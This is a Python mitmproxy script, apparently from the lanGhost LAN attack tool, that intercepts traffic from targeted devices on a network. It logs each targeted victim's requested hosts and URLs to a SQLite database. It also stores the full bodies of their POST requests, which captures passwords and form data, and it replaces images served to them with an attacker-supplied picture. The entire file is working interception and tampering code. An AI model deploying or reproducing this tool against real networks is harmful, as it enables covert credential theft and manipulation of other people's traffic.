#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# proxyScript.py
# author: xdavidhu

from mitmproxy import http
import sqlite3, time, os, base64

script_path = os.path.dirname(os.path.realpath(__file__)) + "/"
DBconn = sqlite3.connect(script_path + "lanGhost.db")
DBcursor = DBconn.cursor()
DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source TEXT,host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
DBconn.commit()
DBconn.close()

# source, host, url, method, data, time

def request(flow):
    DBconn = sqlite3.connect(script_path + "lanGhost.db")
    DBcursor = DBconn.cursor()
    DBcursor.execute("SELECT attackid FROM lanGhost_attacks WHERE target=? AND attack_type='mitm' ORDER BY id DESC LIMIT 1", [str(flow.client_conn.address()[0])])
    data = DBcursor.fetchone()
    if not data == None:
        if flow.request.method == "POST":
            DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), str(flow.request.text), "0"])
            DBconn.commit()
            print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + str(flow.request.text) + " - " + "0")
        else:
            DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), "false", "0"])
            DBconn.commit()
            print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + "false" + " - " +  "0")
    DBconn.close()

def response(flow):
    if flow.response.headers.get("content-type", "").startswith("image"):
        DBconn = sqlite3.connect(script_path + "lanGhost.db")
        DBcursor = DBconn.cursor()
        DBcursor.execute("SELECT img FROM lanGhost_img WHERE targetip = ?", [str(flow.client_conn.address()[0])])
        data = DBcursor.fetchall()
        if not data == []:
            img = data[0][0]
            img = base64.b64decode(img)
            flow.response.content = img
            flow.response.headers["content-type"] = "image/png"
